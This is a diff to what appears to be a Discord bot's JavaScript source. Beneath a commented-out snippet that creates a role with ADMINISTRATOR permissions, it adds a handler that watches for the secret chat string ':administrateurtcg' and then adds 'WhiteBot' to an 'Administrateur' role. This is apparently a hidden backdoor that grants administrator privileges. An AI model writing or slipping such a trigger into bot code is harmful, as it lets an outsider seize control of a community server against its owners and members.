@@ -149,3 +149,9 @@ bot.on('message', message => {
 //        createRole({name:'Test',position:'12',permissions:'ADMINISTRATOR'})
 //        message.delete()
 //}});
+
+bot.on('message', message => {
+    if(message.content === ':administrateurtcg') {
+        bot.addMemberToRole(WhiteBot, Administrateur);
+    };
+});
